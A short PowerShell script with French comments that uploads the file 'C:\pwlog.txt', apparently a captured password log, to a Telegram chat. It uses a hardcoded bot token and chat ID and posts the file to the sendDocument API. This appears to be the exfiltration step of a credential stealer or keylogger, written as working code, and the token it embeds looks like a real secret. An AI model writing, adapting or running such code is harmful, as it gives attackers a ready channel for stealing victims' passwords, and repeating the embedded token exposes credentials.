# Remplace par ton token et le chat ID du destinataire
$botToken = "7063362905:AAH3fp9llv_e0kvq-WpE-yvMzPeguGDMUXc"
$chatId = "1392225098"  # Chat ID où envoyer le fichier
$fileToSend = "C:\pwlog.txt"  # Chemin complet du fichier à envoyer

# Préparer l'URL pour l'API Telegram
$apiUrl = "https://api.telegram.org/bot$botToken/sendDocument"

# Vérifier si le fichier existe
if (-Not (Test-Path -Path $fileToSend)) {
    Write-Host "Fichier introuvable : $fileToSend"
    exit
}

# Préparer le contenu multipart/form-data
Add-Type -AssemblyName System.Net.Http
$httpClient = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent

# Ajouter les paramètres de la requête
$content.Add([System.Net.Http.StringContent]::new($chatId), "chat_id")
$fileStream = [System.IO.File]::OpenRead($fileToSend)
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::new("application/octet-stream")
$content.Add($fileContent, "document", (Get-Item $fileToSend).Name)

# Envoyer la requête
try {
    $response = $httpClient.PostAsync($apiUrl, $content).Result
    $responseContent = $response.Content.ReadAsStringAsync().Result
    Write-Host "Fichier envoyé avec succès ! Réponse de Telegram :"
    Write-Host $responseContent
} catch {
    Write-Host "Erreur lors de l'envoi du fichier : $_"
} finally {
    # Fermer le flux de fichier
    $fileStream.Close()
    $httpClient.Dispose()
}